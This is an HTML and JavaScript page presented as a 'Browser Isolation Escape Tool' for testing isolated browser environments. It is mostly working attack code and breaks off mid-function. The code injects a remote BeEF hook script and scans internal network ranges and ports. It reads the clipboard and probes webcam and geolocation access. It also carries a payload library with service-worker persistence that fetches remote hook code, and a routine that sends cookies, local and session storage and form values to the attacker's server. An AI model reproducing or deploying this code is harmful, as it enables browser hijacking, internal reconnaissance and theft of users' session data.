<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔓 Browser Isolation Escape Tool</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            margin: 0;
            padding: 20px;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            border: 2px solid #ff0000;
            padding: 20px;
            border-radius: 8px;
            background: #1a0000;
        }
        
        .section {
            background: #1a1a1a;
            border: 2px solid #333;
            margin: 20px 0;
            padding: 20px;
            border-radius: 8px;
        }
        
        .critical { border-color: #ff0000; background: #1a0000; }
        .warning { border-color: #ffaa00; background: #1a1500; }
        .success { border-color: #00ff00; background: #001a00; }
        .info { border-color: #4dabf7; background: #001a1a; }
        
        .input-section {
            background: #2a2a2a;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
        }
        
        input[type="text"], input[type="file"], textarea, select {
            background: #1a1a1a;
            border: 2px solid #333;
            color: #00ff00;
            padding: 10px;
            font-family: inherit;
            border-radius: 3px;
            width: 100%;
            box-sizing: border-box;
            margin: 5px 0;
        }
        
        textarea {
            height: 120px;
            resize: vertical;
        }
        
        button {
            background: #2d5a27;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 12px 20px;
            margin: 8px 5px;
            cursor: pointer;
            font-family: inherit;
            font-weight: bold;
            border-radius: 5px;
            transition: all 0.3s;
        }
        
        button:hover {
            background: #00ff00;
            color: #000;
        }
        
        .critical-btn {
            background: #5a1a1a;
            border-color: #ff0000;
            color: #ff6b6b;
        }
        
        .critical-btn:hover {
            background: #ff0000;
            color: #fff;
        }
        
        .warning-btn {
            background: #5a4a1a;
            border-color: #ffaa00;
            color: #ffaa00;
        }
        
        .warning-btn:hover {
            background: #ffaa00;
            color: #000;
        }
        
        .output {
            background: #000;
            border: 1px solid #333;
            padding: 15px;
            margin: 10px 0;
            min-height: 150px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            font-size: 12px;
            border-radius: 3px;
        }
        
        .success { color: #00ff00; }
        .error { color: #ff6b6b; }
        .warning { color: #ffaa00; }
        .info { color: #4dabf7; }
        .critical { color: #ff0000; font-weight: bold; }
        
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 20px;
        }
        
        .progress-bar {
            background: #333;
            border-radius: 10px;
            height: 20px;
            margin: 10px 0;
            overflow: hidden;
        }
        
        .progress-fill {
            background: linear-gradient(90deg, #ff0000, #ffaa00);
            height: 100%;
            width: 0%;
            transition: width 0.3s;
        }
        
        .stats {
            display: flex;
            justify-content: space-around;
            background: #2a2a2a;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-number {
            font-size: 24px;
            font-weight: bold;
            color: #ff6b6b;
        }
        
        .stat-label {
            font-size: 12px;
            color: #888;
        }
        
        .file-drop-zone {
            border: 2px dashed #666;
            padding: 30px;
            text-align: center;
            margin: 15px 0;
            border-radius: 5px;
            transition: all 0.3s;
        }
        
        .file-drop-zone:hover,
        .file-drop-zone.dragover {
            border-color: #00ff00;
            background: #002200;
        }
        
        .target-list {
            max-height: 200px;
            overflow-y: auto;
            background: #000;
            border: 1px solid #333;
            padding: 10px;
            margin: 10px 0;
        }
        
        .target-item {
            padding: 5px;
            margin: 2px 0;
            background: #1a1a1a;
            border-radius: 3px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .status-good { color: #00ff00; }
        .status-bad { color: #ff6b6b; }
        .status-unknown { color: #888; }
        
        .data-table {
            width: 100%;
            border-collapse: collapse;
            margin: 10px 0;
            font-size: 11px;
            background: #000;
        }
        
        .data-table th, .data-table td {
            border: 1px solid #333;
            padding: 8px;
            text-align: left;
            vertical-align: top;
        }
        
        .data-table th {
            background: #2a2a2a;
            color: #00ff00;
            font-weight: bold;
        }
        
        .data-table tr:nth-child(even) {
            background: #1a1a1a;
        }
        
        .data-table tr:hover {
            background: #2a2a2a;
        }
        
        .data-card {
            background: #2a2a2a;
            border: 1px solid #444;
            border-radius: 5px;
            padding: 15px;
            margin: 10px 0;
        }
        
        .data-card h3 {
            margin: 0 0 10px 0;
            color: #00ff00;
            border-bottom: 1px solid #444;
            padding-bottom: 5px;
        }
        
        .data-card .card-content {
            max-height: 200px;
            overflow-y: auto;
            font-size: 11px;
            white-space: pre-wrap;
        }
        
        .key-value-pair {
            display: flex;
            margin: 5px 0;
            padding: 5px;
            background: #1a1a1a;
            border-radius: 3px;
        }
        
        .key-value-pair .key {
            color: #4dabf7;
            font-weight: bold;
            min-width: 150px;
            margin-right: 10px;
        }
        
        .key-value-pair .value {
            color: #00ff00;
            word-break: break-all;
        }
        
        .json-viewer {
            background: #000;
            border: 1px solid #333;
            border-radius: 3px;
            padding: 10px;
            margin: 5px 0;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            white-space: pre-wrap;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .json-key {
            color: #4dabf7;
        }
        
        .json-string {
            color: #00ff00;
        }
        
        .json-number {
            color: #ffaa00;
        }
        
        .json-boolean {
            color: #ff6b6b;
        }
        
        .screenshot-section {
            background: #000;
            border: 2px solid #00ff00;
            border-radius: 5px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .screenshot-section h3 {
            color: #00ff00;
            margin: 0 0 15px 0;
            text-align: center;
        }
        
        .highlight-box {
            background: #2a2a2a;
            border: 2px solid #ffaa00;
            border-radius: 5px;
            padding: 15px;
            margin: 10px 0;
        }
        
        .highlight-box h4 {
            color: #ffaa00;
            margin: 0 0 10px 0;
        }
        
        .extension-card {
            background: #2a0000;
            border: 1px solid #ff6b6b;
            border-radius: 5px;
            padding: 10px;
            margin: 5px 0;
        }
        
        .extension-card h4 {
            color: #ff6b6b;
            margin: 0 0 5px 0;
        }
        
        .network-host {
            background: #1a2a1a;
            border: 1px solid #00ff00;
            border-radius: 3px;
            padding: 8px;
            margin: 5px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .network-host .host-info {
            color: #00ff00;
        }
        
        .network-host .host-status {
            font-size: 10px;
            padding: 2px 6px;
            border-radius: 3px;
        }
        
        .accessible { background: #2a5a2a; color: #00ff00; }
        .blocked { background: #5a2a2a; color: #ff6b6b; }
        .timeout { background: #5a5a2a; color: #ffaa00; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔓 Browser Isolation Escape Tool</h1>
            <p>Advanced browser and network abuse testing for isolation environments</p>
            <div class="stats" id="stats">
                <div class="stat-item">
                    <div class="stat-number" id="browser-tests">0</div>
                    <div class="stat-label">Browser Tests</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number" id="network-targets">0</div>
                    <div class="stat-label">Network Targets</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number" id="successful-attacks">0</div>
                    <div class="stat-label">Successful</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number" id="escape-attempts">0</div>
                    <div class="stat-label">Escape Attempts</div>
                </div>
            </div>
        </div>

        <!-- BeEF Integration -->
        <div class="section critical">
            <h2>🥩 BeEF Framework Integration</h2>
            <div class="input-section">
                <label>BeEF Hook URL:</label>
                <input type="text" id="beef-hook-url" placeholder="http://your-beef-server:3000/hook.js" style="width: 70%; display: inline-block;">
                <button class="critical-btn" onclick="loadBeEFHook()" style="width: 25%; margin-left: 2%;">🪝 Hook Browser</button>
            </div>
            <div class="input-section">
                <label>BeEF Control Panel:</label>
                <input type="text" id="beef-panel-url" placeholder="http://your-beef-server:3000/ui/panel" style="width: 70%; display: inline-block;">
                <button onclick="openBeEFPanel()" style="width: 25%; margin-left: 2%;">🎛️ Open Panel</button>
            </div>
            <div class="input-section">
                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                    <button class="warning-btn" onclick="testBeEFConnection()">Test Connection</button>
                    <button class="critical-btn" onclick="executeBeEFCommands()">Execute Commands</button>
                    <button onclick="unhookBeEF()">Unhook Browser</button>
                    <button onclick="loadBeEFPayloads()">Load Payloads</button>
                </div>
            </div>
            <div id="beef-status" style="padding: 10px; margin: 10px 0; border: 1px solid #333; background: #000; border-radius: 3px; font-size: 12px;">
                <span class="status-unknown">BeEF Status: Not Connected</span>
            </div>
            <div id="beef-output" class="output" style="max-height: 200px;"></div>
        </div>

        <!-- Target Management -->
        <div class="section critical">
            <h2>🎯 Target Management</h2>
            <div class="input-section">
                <label>Upload Target List (CSV/TXT):</label>
                <div class="file-drop-zone" id="file-drop-zone">
                    <p>Drop target list here or click to browse</p>
                    <input type="file" id="target-file" accept=".csv,.txt,.json" style="display: none;">
                </div>
                <button onclick="document.getElementById('target-file').click()">📁 Browse Files</button>
                <button onclick="loadSampleTargets()">📋 Load Sample Targets</button>
            </div>
            
            <div class="input-section">
                <label>Manual Target Entry:</label>
                <textarea id="manual-targets" placeholder="192.168.1.100&#10;internal.company.com:8080&#10;10.0.0.50:443&#10;172.16.10.5:9000"></textarea>
                <button onclick="addManualTargets()">Add Targets</button>
                <button onclick="generateLocalNetwork()">🌐 Generate Local Network Range</button>
            </div>

            <div class="target-list" id="target-list"></div>
            
            <div>
                <button class="critical-btn" onclick="runAllTests()">🚀 RUN ALL ESCAPE TESTS</button>
                <button onclick="clearTargets()">Clear Targets</button>
                <button onclick="exportResults()">Export Results</button>
            </div>
            
            <div class="progress-bar">
                <div class="progress-fill" id="progress-fill"></div>
            </div>
        </div>

        <div class="grid">
            <!-- Browser Abuse Testing -->
            <div class="section critical">
                <h2>🌐 Browser Abuse Testing</h2>
                <button class="critical-btn" onclick="testExtensionAccess()">Extension Enumeration</button>
                <button class="critical-btn" onclick="testConfigModification()">Config Modification</button>
                <button class="warning-btn" onclick="testLocalFileAccess()">Local File Access</button>
                <button class="warning-btn" onclick="testLocalStorage()">Local Storage Abuse</button>
                <div id="browser-output" class="output"></div>
            </div>

            <!-- Custom JavaScript Execution -->
            <div class="section warning">
                <h2>⚡ Custom JavaScript Execution</h2>
                <div class="input-section">
                    <textarea id="custom-js" placeholder="// Enter custom JavaScript for execution&#10;console.log('Escape attempt initiated');&#10;// Example: Access browser internals, modify DOM, etc."></textarea>
                    <button class="critical-btn" onclick="executeCustomJS()">Execute Custom JS</button>
                    <button onclick="loadJSPayloads()">Load Payload Library</button>
                </div>
                <div id="javascript-output" class="output"></div>
            </div>

            <!-- Network Enumeration -->
            <div class="section critical">
                <h2>🕸️ Network Enumeration</h2>
                <button class="critical-btn" onclick="enumerateLocalHosts()">Local Host Discovery</button>
                <button class="critical-btn" onclick="testInternalAssets()">Test Internal Assets</button>
                <div id="network-output" class="output"></div>
            </div>

            <!-- Results and Reporting -->
            <div class="section success">
                <h2>📊 Results Analysis</h2>
                <button onclick="generateComprehensiveReport()">Generate Report</button>
                <button onclick="exportResults()">Export Results</button>
                <div id="results-output" class="output"></div>
            </div>
        </div>
    </div>

    <script>
        let targets = [];
        let testResults = {};
        let browserTestCount = 0;
        let successfulAttacks = 0;
        let escapeAttempts = 0;
        let beefHooked = false;
        let beefHookUrl = '';
        let beefCommands = [];

        function log(section, message, type = 'info') {
            const output = document.getElementById(section + '-output');
            const timestamp = new Date().toLocaleTimeString();
            const indicator = type === 'success' ? '✅' : type === 'error' ? '❌' : type === 'warning' ? '⚠️' : type === 'critical' ? '🚨' : 'ℹ️';
            
            output.innerHTML += `<span class="${type}">[${timestamp}] ${indicator} ${message}</span>\n`;
            output.scrollTop = output.scrollHeight;
            
            if (!testResults[section]) testResults[section] = [];
            testResults[section].push({timestamp, message, type});
        }

        function displayDataTable(containerId, title, data, columns) {
            const container = document.getElementById(containerId);
            
            const tableHtml = `
                <div class="screenshot-section">
                    <h3>📊 ${title}</h3>
                    <table class="data-table">
                        <thead>
                            <tr>${columns.map(col => `<th>${col}</th>`).join('')}</tr>
                        </thead>
                        <tbody>
                            ${data.map(row => `<tr>${columns.map(col => `<td>${row[col] || 'N/A'}</td>`).join('')}</tr>`).join('')}
                        </tbody>
                    </table>
                </div>
            `;
            
            container.innerHTML += tableHtml;
        }

        function displayDataCard(containerId, title, data, type = 'json') {
            const container = document.getElementById(containerId);
            
            let content = '';
            if (type === 'json') {
                content = `<div class="json-viewer">${formatJSON(data)}</div>`;
            } else if (type === 'key-value') {
                content = Object.entries(data).map(([key, value]) => 
                    `<div class="key-value-pair">
                        <span class="key">${key}:</span>
                        <span class="value">${typeof value === 'object' ? JSON.stringify(value) : value}</span>
                    </div>`
                ).join('');
            } else {
                content = `<div class="card-content">${data}</div>`;
            }
            
            const cardHtml = `
                <div class="data-card">
                    <h3>${title}</h3>
                    ${content}
                </div>
            `;
            
            container.innerHTML += cardHtml;
        }

        function formatJSON(obj) {
            const json = JSON.stringify(obj, null, 2);
            return json
                .replace(/"([^"]+)":/g, '<span class="json-key">"$1"</span>:')
                .replace(/: "([^"]+)"/g, ': <span class="json-string">"$1"</span>')
                .replace(/: (\d+)/g, ': <span class="json-number">$1</span>')
                .replace(/: (true|false)/g, ': <span class="json-boolean">$1</span>');
        }

        function displayHighlightBox(containerId, title, content, type = 'warning') {
            const container = document.getElementById(containerId);
            
            const boxHtml = `
                <div class="highlight-box">
                    <h4>🚨 ${title}</h4>
                    <div>${content}</div>
                </div>
            `;
            
            container.innerHTML += boxHtml;
        }

        function updateStats() {
            document.getElementById('browser-tests').textContent = browserTestCount;
            document.getElementById('network-targets').textContent = targets.length;
            document.getElementById('successful-attacks').textContent = successfulAttacks;
            document.getElementById('escape-attempts').textContent = escapeAttempts;
            
            // Update BeEF status
            const beefStatus = document.getElementById('beef-status');
            if (beefHooked) {
                beefStatus.innerHTML = '<span class="status-good">🥩 BeEF Status: Connected & Hooked</span>';
            } else {
                beefStatus.innerHTML = '<span class="status-unknown">BeEF Status: Not Connected</span>';
            }
        }

        function updateProgress(current, total) {
            const progress = (current / total) * 100;
            document.getElementById('progress-fill').style.width = progress + '%';
        }

        // File handling
        document.getElementById('target-file').addEventListener('change', handleFileUpload);
        
        function handleFileUpload(event) {
            const file = event.target.files[0];
            if (!file) return;
            
            const reader = new FileReader();
            reader.onload = function(e) {
                const content = e.target.result;
                parseTargetFile(content, file.name);
            };
            reader.readAsText(file);
        }

        function parseTargetFile(content, filename) {
            const lines = content.split('\n').map(line => line.trim()).filter(line => line);
            let newTargets = [];
            
            if (filename.endsWith('.csv')) {
                // Parse CSV format
                lines.forEach(line => {
                    const parts = line.split(',');
                    if (parts.length >= 1) {
                        newTargets.push({
                            host: parts[0].trim(),
                            port: parts[1] ? parts[1].trim() : '',
                            service: parts[2] ? parts[2].trim() : 'unknown',
                            status: 'unknown'
                        });
                    }
                });
            } else {
                // Parse as plain text
                lines.forEach(line => {
                    if (line.includes(':')) {
                        const [host, port] = line.split(':');
                        newTargets.push({
                            host: host.trim(),
                            port: port.trim(),
                            service: 'unknown',
                            status: 'unknown'
                        });
                    } else {
                        newTargets.push({
                            host: line.trim(),
                            port: '',
                            service: 'unknown',
                            status: 'unknown'
                        });
                    }
                });
            }
            
            targets = targets.concat(newTargets);
            updateTargetList();
            updateStats();
            log('results', `Loaded ${newTargets.length} targets from ${filename}`, 'success');
        }

        function addManualTargets() {
            const manualText = document.getElementById('manual-targets').value;
            const lines = manualText.split('\n').map(line => line.trim()).filter(line => line);
            
            lines.forEach(line => {
                if (line.includes(':')) {
                    const [host, port] = line.split(':');
                    targets.push({
                        host: host.trim(),
                        port: port.trim(),
                        service: 'manual',
                        status: 'unknown'
                    });
                } else {
                    targets.push({
                        host: line.trim(),
                        port: '',
                        service: 'manual',
                        status: 'unknown'
                    });
                }
            });
            
            document.getElementById('manual-targets').value = '';
            updateTargetList();
            updateStats();
            log('results', `Added ${lines.length} manual targets`, 'success');
        }

        function generateLocalNetwork() {
            const commonNetworks = [
                '192.168.1.1-255',
                '192.168.0.1-255',
                '10.0.0.1-255',
                '172.16.0.1-255',
                '192.168.100.1-255'
            ];
            
            const commonPorts = ['80', '443', '8080', '8443', '9000', '3000', '5000'];
            
            commonNetworks.forEach(network => {
                const [baseIP, range] = network.split('-');
                const ipParts = baseIP.split('.');
                const baseNetwork = ipParts.slice(0, 3).join('.');
                const endHost = parseInt(range);
                
                for (let host = 1; host <= Math.min(endHost, 50); host++) { // Limit to first 50 IPs
                    const ip = `${baseNetwork}.${host}`;
                    
                    // Add without port
                    targets.push({
                        host: ip,
                        port: '',
                        service: 'auto-generated',
                        status: 'unknown'
                    });
                    
                    // Add with common ports
                    commonPorts.forEach(port => {
                        targets.push({
                            host: ip,
                            port: port,
                            service: 'auto-generated',
                            status: 'unknown'
                        });
                    });
                }
            });
            
            updateTargetList();
            updateStats();
            log('results', `Generated ${targets.length} local network targets`, 'success');
        }

        function loadSampleTargets() {
            const sampleTargets = [
                { host: '192.168.1.1', port: '80', service: 'router', status: 'unknown' },
                { host: '192.168.1.1', port: '443', service: 'router-ssl', status: 'unknown' },
                { host: '10.0.0.1', port: '8080', service: 'admin', status: 'unknown' },
                { host: 'internal.company.com', port: '443', service: 'intranet', status: 'unknown' },
                { host: 'mail.internal', port: '443', service: 'mail', status: 'unknown' },
                { host: '172.16.10.5', port: '9000', service: 'app-server', status: 'unknown' },
                { host: 'jenkins.internal', port: '8080', service: 'ci-cd', status: 'unknown' },
                { host: 'grafana.internal', port: '3000', service: 'monitoring', status: 'unknown' }
            ];
            
            targets = targets.concat(sampleTargets);
            updateTargetList();
            updateStats();
            log('results', 'Loaded sample internal targets', 'success');
        }

        function updateTargetList() {
            const listContainer = document.getElementById('target-list');
            listContainer.innerHTML = '';
            
            targets.slice(0, 20).forEach((target, index) => { // Show first 20
                const item = document.createElement('div');
                item.className = 'target-item';
                
                const statusClass = target.status === 'accessible' ? 'status-good' : 
                                  target.status === 'blocked' ? 'status-bad' : 'status-unknown';
                
                const fullTarget = target.port ? `${target.host}:${target.port}` : target.host;
                
                item.innerHTML = `
                    <span class="${statusClass}">${fullTarget} (${target.service})</span>
                    <span class="${statusClass}">${target.status}</span>
                `;
                
                listContainer.appendChild(item);
            });
            
            if (targets.length > 20) {
                const moreItem = document.createElement('div');
                moreItem.className = 'target-item';
                moreItem.innerHTML = `<span class="status-unknown">... and ${targets.length - 20} more targets</span>`;
                listContainer.appendChild(moreItem);
            }
        }

        function clearTargets() {
            targets = [];
            updateTargetList();
            updateStats();
            log('results', 'All targets cleared', 'warning');
        }

        // BeEF Framework Integration Functions
        function loadBeEFHook() {
            const hookUrl = document.getElementById('beef-hook-url').value.trim();
            
            if (!hookUrl) {
                log('beef', 'Please enter a BeEF hook URL', 'error');
                return;
            }
            
            if (beefHooked) {
                log('beef', 'Browser is already hooked to BeEF', 'warning');
                return;
            }
            
            log('beef', `🪝 Attempting to load BeEF hook from: ${hookUrl}`, 'critical');
            
            try {
                // Remove existing BeEF script if present
                const existingScript = document.getElementById('beef-hook-script');
                if (existingScript) {
                    existingScript.remove();
                }
                
                // Create and inject BeEF hook script
                const script = document.createElement('script');
                script.id = 'beef-hook-script';
                script.src = hookUrl;
                script.type = 'text/javascript';
                
                script.onload = function() {
                    beefHooked = true;
                    beefHookUrl = hookUrl;
                    log('beef', '🚨 BeEF hook loaded successfully! Browser is now hooked.', 'critical');
                    log('beef', 'BeEF commands can now be executed from the control panel', 'success');
                    successfulAttacks++;
                    updateStats();
                    
                    // Test if BeEF object is available
                    setTimeout(() => {
                        if (typeof beef !== 'undefined') {
                            log('beef', '✅ BeEF object detected in global scope', 'success');
                            log('beef', `BeEF Session: ${beef.session ? beef.session.get_hook_session_id() : 'Unknown'}`, 'info');
                        }
                    }, 1000);
                };
                
                script.onerror = function() {
                    log('beef', '❌ Failed to load BeEF hook script', 'error');
                    log('beef', 'Check if BeEF server is running and URL is correct', 'warning');
                };
                
                document.head.appendChild(script);
                
            } catch (error) {
                log('beef', `BeEF hook loading error: ${error.message}`, 'error');
            }
        }
        
        function testBeEFConnection() {
            const hookUrl = document.getElementById('beef-hook-url').value.trim();
            
            if (!hookUrl) {
                log('beef', 'Please enter a BeEF hook URL first', 'error');
                return;
            }
            
            log('beef', '🔍 Testing BeEF server connection...', 'info');
            
            // Test connection to BeEF server
            fetch(hookUrl, {
                method: 'HEAD',
                mode: 'no-cors',
                signal: AbortSignal.timeout(5000)
            })
            .then(() => {
                log('beef', '✅ BeEF server is reachable', 'success');
            })
            .catch(error => {
                log('beef', `❌ BeEF server connection failed: ${error.message}`, 'error');
                log('beef', 'Ensure BeEF is running and accessible from this network', 'warning');
            });
            
            // If already hooked, test BeEF functionality
            if (beefHooked && typeof beef !== 'undefined') {
                try {
                    log('beef', '🧪 Testing BeEF functionality...', 'info');
                    
                    // Test basic BeEF functions
                    if (beef.browser) {
                        log('beef', `Browser: ${beef.browser.getBrowserName()} ${beef.browser.getBrowserVersion()}`, 'info');
                    }
                    
                    if (beef.net) {
                        log('beef', '✅ BeEF network functions available', 'success');
                    }
                    
                    if (beef.dom) {
                        log('beef', '✅ BeEF DOM functions available', 'success');
                    }
                    
                    log('beef', '✅ BeEF is fully functional', 'success');
                    
                } catch (error) {
                    log('beef', `BeEF functionality test failed: ${error.message}`, 'error');
                }
            }
        }
        
        function executeBeEFCommands() {
            if (!beefHooked) {
                log('beef', 'Browser must be hooked to BeEF first', 'error');
                return;
            }
            
            log('beef', '⚡ Executing BeEF command suite...', 'critical');
            escapeAttempts++;
            
            // Execute common BeEF commands for browser isolation testing
            const commands = [
                {
                    name: 'Get Browser Information',
                    exec: () => {
                        if (typeof beef !== 'undefined' && beef.browser) {
                            const info = {
                                name: beef.browser.getBrowserName(),
                                version: beef.browser.getBrowserVersion(),
                                platform: beef.browser.getBrowserPlatform(),
                                plugins: beef.browser.getPlugins(),
                            };
                            log('beef', `Browser Info: ${JSON.stringify(info, null, 2)}`, 'info');
                            return true;
                        }
                        return false;
                    }
                },
                {
                    name: 'Network Discovery',
                    exec: () => {
                        if (typeof beef !== 'undefined' && beef.net) {
                            try {
                                // BeEF network discovery
                                beef.net.local_network_discovery();
                                log('beef', '🌐 Network discovery initiated via BeEF', 'success');
                                return true;
                            } catch (error) {
                                log('beef', `Network discovery failed: ${error.message}`, 'error');
                                return false;
                            }
                        }
                        return false;
                    }
                },
                {
                    name: 'Port Scanning',
                    exec: () => {
                        if (typeof beef !== 'undefined' && beef.net) {
                            try {
                                const targets = ['127.0.0.1', '192.168.1.1', '10.0.0.1'];
                                const ports = [80, 443, 8080, 22, 21, 25];
                                
                                targets.forEach(target => {
                                    ports.forEach(port => {
                                        beef.net.port_scanner(target, port, 1000);
                                    });
                                });
                                
                                log('beef', '🔍 Port scanning initiated via BeEF', 'success');
                                return true;
                            } catch (error) {
                                log('beef', `Port scanning failed: ${error.message}`, 'error');
                                return false;
                            }
                        }
                        return false;
                    }
                },
                {
                    name: 'Webcam Access',
                    exec: () => {
                        try {
                            navigator.mediaDevices.getUserMedia({ video: true })
                                .then(stream => {
                                    log('beef', '🚨 Webcam access granted!', 'critical');
                                    successfulAttacks++;
                                    stream.getTracks().forEach(track => track.stop());
                                    updateStats();
                                })
                                .catch(error => {
                                    log('beef', `Webcam access denied: ${error.message}`, 'warning');
                                });
                            return true;
                        } catch (error) {
                            log('beef', `Webcam test failed: ${error.message}`, 'error');
                            return false;
                        }
                    }
                },
                {
                    name: 'Geolocation Access',
                    exec: () => {
                        try {
                            navigator.geolocation.getCurrentPosition(
                                position => {
                                    log('beef', `🚨 Location accessed: ${position.coords.latitude}, ${position.coords.longitude}`, 'critical');
                                    successfulAttacks++;
                                    updateStats();
                                },
                                error => {
                                    log('beef', `Geolocation denied: ${error.message}`, 'warning');
                                }
                            );
                            return true;
                        } catch (error) {
                            log('beef', `Geolocation test failed: ${error.message}`, 'error');
                            return false;
                        }
                    }
                },
                {
                    name: 'Clipboard Access',
                    exec: () => {
                        try {
                            if (navigator.clipboard) {
                                navigator.clipboard.readText()
                                    .then(text => {
                                        log('beef', `🚨 Clipboard content read: ${text.substring(0, 100)}...`, 'critical');
                                        successfulAttacks++;
                                        updateStats();
                                    })
                                    .catch(error => {
                                        log('beef', `Clipboard access denied: ${error.message}`, 'warning');
                                    });
                                
                                navigator.clipboard.writeText('BeEF clipboard test - ' + Date.now())
                                    .then(() => {
                                        log('beef', '🚨 Clipboard write successful!', 'critical');
                                        successfulAttacks++;
                                        updateStats();
                                    })
                                    .catch(error => {
                                        log('beef', `Clipboard write denied: ${error.message}`, 'warning');
                                    });
                                return true;
                            }
                            return false;
                        } catch (error) {
                            log('beef', `Clipboard test failed: ${error.message}`, 'error');
                            return false;
                        }
                    }
                }
            ];
            
            // Execute each command with delay
            commands.forEach((command, index) => {
                setTimeout(() => {
                    log('beef', `Executing: ${command.name}`, 'info');
                    try {
                        const result = command.exec();
                        if (result) {
                            log('beef', `✅ ${command.name} executed successfully`, 'success');
                        } else {
                            log('beef', `❌ ${command.name} failed to execute`, 'error');
                        }
                    } catch (error) {
                        log('beef', `${command.name} error: ${error.message}`, 'error');
                    }
                }, index * 1000);
            });
            
            updateStats();
            log('beef', 'BeEF command execution initiated', 'success');
        }
        
        function loadBeEFPayloads() {
            log('beef', '📦 Loading BeEF payload library...', 'info');
            
            const payloads = `
// BeEF Integration Payloads for Browser Isolation Testing

// 1. Advanced Browser Fingerprinting
function beefBrowserFingerprint() {
    if (typeof beef !== 'undefined') {
        const fingerprint = {
            browser: beef.browser.getBrowserName() + ' ' + beef.browser.getBrowserVersion(),
            platform: beef.browser.getBrowserPlatform(),
            screen: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            plugins: Array.from(navigator.plugins).map(p => p.name),
            cookiesEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            } : null
        };
        
        console.log('BeEF Browser Fingerprint:', fingerprint);
        
        // Send to BeEF if available
        if (beef.net && beef.net.send) {
            beef.net.send('/fingerprint', JSON.stringify(fingerprint));
        }
        
        return fingerprint;
    }
    return null;
}

// 2. Internal Network Discovery via BeEF
function beefNetworkDiscovery() {
    if (typeof beef !== 'undefined' && beef.net) {
        const localRanges = [
            '192.168.1.1-255',
            '192.168.0.1-255', 
            '10.0.0.1-255',
            '172.16.0.1-255'
        ];
        
        localRanges.forEach(range => {
            const [baseRange, endRange] = range.split('-');
            const baseIP = baseRange.substring(0, baseRange.lastIndexOf('.') + 1);
            const endNum = parseInt(endRange);
            
            for (let i = 1; i <= Math.min(endNum, 20); i++) {
                const targetIP = baseIP + i;
                setTimeout(() => {
                    beef.net.port_scanner(targetIP, 80, 1000);
                    beef.net.port_scanner(targetIP, 443, 1000);
                    beef.net.port_scanner(targetIP, 8080, 1000);
                }, i * 100);
            }
        });
        
        console.log('BeEF network discovery initiated');
        return true;
    }
    return false;
}

// 3. Persistence via BeEF
function beefEstablishPersistence() {
    if (typeof beef !== 'undefined') {
        // Service Worker persistence
        if ('serviceWorker' in navigator) {
            const swCode = \`
                self.addEventListener('fetch', event => {
                    if (event.request.url.includes('beef-persist')) {
                        event.respondWith(
                            fetch('${beefHookUrl}').then(response => response.text())
                            .then(hookCode => new Response(hookCode, {
                                headers: { 'Content-Type': 'application/javascript' }
                            }))
                        );
                    }
                });
            \`;
            
            navigator.serviceWorker.register(
                'data:application/javascript,' + encodeURIComponent(swCode)
            ).then(() => {
                console.log('BeEF persistence via Service Worker established');
            }).catch(err => {
                console.log('Service Worker persistence failed:', err);
            });
        }
        
        // LocalStorage persistence
        try {
            localStorage.setItem('beef_persistence', JSON.stringify({
                hookUrl: beefHookUrl,
                timestamp: Date.now(),
                sessionId: beef.session ? beef.session.get_hook_session_id() : null
            }));
            console.log('BeEF persistence via localStorage established');
        } catch (e) {
            console.log('localStorage persistence failed:', e);
        }
        
        return true;
    }
    return false;
}

// 4. Data Exfiltration via BeEF
function beefDataExfiltration() {
    if (typeof beef !== 'undefined' && beef.net) {
        const sensitiveData = {
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            userAgent: navigator.userAgent,
            referrer: document.referrer,
            location: window.location.href,
            formData: Array.from(document.querySelectorAll('input')).map(input => ({
                name: input.name,
                type: input.type,
                value: input.type === 'password' ? '[REDACTED]' : input.value
            }))
        };
        
        // Exfiltrate via BeEF
        try {
            beef.net.send('/exfiltrate', JSON.stringify(sensitiveData));
            console.log('Data exfiltrated via BeEF');
            return true;
        } catch (error) {
            console.log('BeEF exfiltration failed:', error);
            return false;
        }
    }
    return false;
}

// 5. Browser Isolation Escape Tests
function beefIsolationEscapeTests() {
    const tests = [
        {
            name: 'File System Access',
            test: () => {
                const input = document.createElement('input');
                input.type = 'file';
                input.webkitdirectory = true;
                return input.webkitdirectory === true;
            }
        },
        {
            name: 'Window Object Access',
            test: () => {
                try {
                    return window.parent !== window;
                } catch (e) {
                    return false;
                }
            }
        },
        {
            name: 'Chrome Extension API',
            test: () => {
                return typeof chrome !== 'undefined' && chrome.runtime;
            }
        },
        {
            name: 'Node.js Detection',
            test: () => {
                return typeof process !== 'undefined' && process.versions && process.versions.node;
            }
        },
        {
            name: 'Electron Detection',
            test: () => {
                return typeof window !== 'undefined' && window.process && window.process.type;
            }
        }
    ];
    
    const results = tests.map(test => ({
        name: test.name,
        result: test.test(),
        timestamp: Date.now()
    }));
    
